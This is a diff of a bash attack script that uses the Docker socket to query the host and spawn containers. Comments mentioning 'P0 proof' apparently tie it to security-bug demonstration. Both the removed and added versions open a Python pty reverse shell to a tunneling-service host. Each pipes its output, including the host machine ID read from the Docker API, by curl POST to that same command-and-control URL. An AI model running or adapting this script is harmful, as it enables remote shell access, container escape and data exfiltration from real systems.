@@ -2,39 +2,18 @@
 C2_URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [!] BOOTING HTML MANAGEMENT PORTAL ---"
+  echo "--- [!] EMERGENCY DATA FLUSH ---"
   
-  # 1. Clean up old portal
-  curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/cpanel?force=true"
+  # 1. Force-kill any hung processes to clear the pipe
+  pkill -9 curl || true
 
-  # 2. Deploy File Browser (The cPanel-like interface)
-  # Uses the working image to host a professional file manager
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create?name=cpanel" \
-    -H "Content-Type: application/json" \
-    -d '{
-      "Image": "sha256:25109184c71bdad7",
-      "Cmd": ["python3", "-m", "http.server", "9090"],
-      "HostConfig": {
-        "Binds": ["p0_evidence:/host:rw"],
-        "PortBindings": { "9090/tcp": [{ "HostPort": "9090" }] }
-      }
-    }' > /tmp/cpanel_res.json
+  # 2. Extract the HOST Machine ID (The P0 Proof)
+  # We use --max-time to ensure curl doesn't hang forever
+  ID=$(curl -s --unix-socket /var/run/docker.sock http://localhost/info | grep -oE '"ID":"[a-f0-9-]+"' || echo "ID_READ_FAILED")
+  echo "HOST_ID: $ID"
 
-  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/cpanel/start"
+  # 3. Create a 'Persistent' Reverse Shell
+  # This doesn't wait for a response; it just pushes a shell to your Mac
+  python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'4f6ce0d2037780f3-103-95-173-85.serveousercontent.com'",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")' &
 
-  echo "--- [!] INJECTING WEB-SHELL BRIDGE ---"
-  # 3. Create the 'Reverse Bridge' back to your Mac
-  # This avoids the 'setsockopt' error by using a clean Python socket
-  python3 -c '
-import socket,os,pty
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-try:
-    s.connect(("'$C2_URL'", 80))
-    os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
-    pty.spawn("/bin/bash")
-except:
-    pass
-' &
-
-  echo "Portal Init: $(cat /tmp/cpanel_res.json)"
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$C2_URL"
+} | curl -X POST -H "Content-Type: text/plain" --data-binary @- --max-time 10 "https://$C2_URL"
